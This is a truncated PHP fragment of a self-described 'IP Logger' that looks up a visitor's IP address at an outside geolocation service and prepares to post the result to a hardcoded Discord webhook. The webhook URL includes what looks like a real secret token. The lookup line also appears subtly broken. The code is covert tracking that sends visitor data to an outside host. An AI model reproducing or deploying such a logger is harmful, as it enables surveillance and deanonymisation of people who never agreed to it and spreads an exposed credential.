...
$url = "https://discord.com/api/webhooks/933588996460773406/lqQ43ZO-IQtoyhXSGn8qrmsDKoj0ZtMzF9bsTPFyApJ90Ew55DXyPMdosl0Evo95oqqM";


$iplookup = file_get_contents("http://extreme-ip-lookup.com/json/{ip}");

$hookObject = json_encode([
    "username" => "IP Logger by matteo ",
